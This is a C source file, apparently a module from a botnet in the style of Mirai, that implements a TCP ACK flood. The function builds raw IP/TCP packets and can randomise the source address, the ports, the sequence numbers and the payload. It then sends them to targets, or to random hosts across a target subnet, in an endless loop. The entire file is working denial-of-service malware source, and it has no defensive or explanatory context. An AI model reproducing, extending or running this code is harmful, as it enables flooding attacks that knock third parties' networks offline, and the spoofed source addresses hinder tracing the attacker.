#define _GNU_SOURCE

#include "../../attack.h"

void flood_ack(struct flood *flood)
{
    int i, fd;
    char **packets = calloc(flood->num_of_targets, sizeof(char *));

    flood->settings->ack = get_option_number(flood->num_of_options, flood->options, OPT_ACK, 1);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        debug("Could not create a RAW socket for an TCP attack.");
        return;
    }

    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        debug("Could not set IP_HDRINCL for an TCP attack.");
        close(fd);
        return;
    }

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct iphdr *ip_header;
        struct tcphdr *tcp_header;

        packets[i] = calloc(1510, sizeof(char));
        ip_header = (struct iphdr *)packets[i];
        tcp_header = (struct tcphdr *)(ip_header + 1);

        ip_header->version = 4;
        ip_header->ihl = 5;

        ip_header->tos = flood->settings->tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length);
        ip_header->id = htons(flood->settings->ident);
        ip_header->ttl = flood->settings->ttl;

        if (flood->settings->dont_fragment)
            ip_header->frag_off = htons(1 << 14);

        ip_header->protocol = IPPROTO_TCP;

        ip_header->saddr = flood->settings->source_ip;
        ip_header->daddr = flood->targets[i].addr;

        tcp_header->source = htons(flood->settings->source_port);
        tcp_header->dest = htons(flood->settings->dest_port);
        tcp_header->seq = htons(flood->settings->seq_rnd);

        tcp_header->doff = 10;

        tcp_header->urg = flood->settings->urg;
        tcp_header->ack = flood->settings->ack;
        tcp_header->psh = flood->settings->psh;
        tcp_header->rst = flood->settings->rst;
        tcp_header->syn = flood->settings->syn;
        tcp_header->fin = flood->settings->fin;
        tcp_header->window = rand_next() & 0xffff;
    }

    while (TRUE)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            char *packet = packets[i];
            struct iphdr *ip_header = (struct iphdr *)packet;
            struct tcphdr *tcp_header = (struct tcphdr *)(ip_header + 1);
            struct flood_target target = flood->targets[i];
            char *data = (char *)(tcp_header + 1);

            if (target.netmask < 32)
                ip_header->daddr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            if (flood->settings->source_ip == 0xffffffff)
                ip_header->saddr = rand_next();

            if (flood->settings->ident == 0xffff)
                ip_header->id = rand_next() & 0xffff;

            if (flood->settings->source_port == 0xffff)
                tcp_header->source = rand_next() & 0xffff;

            if (flood->settings->dest_port == 0xffff)
                tcp_header->dest = rand_next() & 0xffff;

            if (flood->settings->seq_rnd == 0xffff)
                tcp_header->seq = rand_next();

            if (flood->settings->ack_seq_rnd == 0xffff)
                tcp_header->ack_seq = rand_next();

            if (flood->settings->urg)
                tcp_header->urg_ptr = rand_next() & 0xffff;

            // Randomize payload when data randomization is turned on.
            if (flood->settings->random_data)
            {
                if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                    flood->settings->length = rand_next_range(flood->settings->min_length, flood->settings->max_length);

                rand_str(data, flood->settings->length);
            }

            ip_header->check = 0;
            ip_header->check = checksum_generic((uint16_t *)ip_header, sizeof(struct iphdr));

            tcp_header->check = 0;
            tcp_header->check = checksum_tcpudp(ip_header, tcp_header, htons(sizeof(struct tcphdr) + flood->settings->length), sizeof(struct tcphdr) + flood->settings->length);

            target.sock_addr.sin_port = tcp_header->dest;

            sendto(fd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length, MSG_NOSIGNAL, (struct sockaddr *)&flood->targets[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}
